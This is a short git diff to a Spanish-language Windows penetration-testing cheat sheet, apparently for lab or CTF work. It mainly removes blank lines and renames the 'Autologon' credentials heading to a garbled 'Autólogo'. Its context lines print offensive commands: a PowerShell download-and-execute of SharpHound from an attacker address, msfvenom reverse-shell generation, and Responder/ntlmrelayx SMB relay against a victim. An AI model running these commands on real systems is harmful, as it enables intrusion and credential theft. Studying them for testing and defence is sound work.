@@ -133,19 +133,16 @@ copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe #Windows
 ```python
 gpp-decrypt "<hash>"
 ```
-
 ### Web Client
 
 ```python
 IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.64/SharpHound.ps1')
 ```
-
 ### Generación de Reverse Shell ejecutable
 
 ```python
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
 ```
-
 ### SMBRelay
 
 ```python
@@ -158,8 +155,7 @@ sudo responder -I eth0 -dw
 impacket-ntlmrelayx -t <IP_VÍCTIMA> -smb2support
 #(Actualizar este punto porque parece que los comandos y la ejecución está bastante deprecada)
 ```
-
-### Credenciales Autologon
+### Credenciales Autólogo
 
 ```python
 cd HKLM:
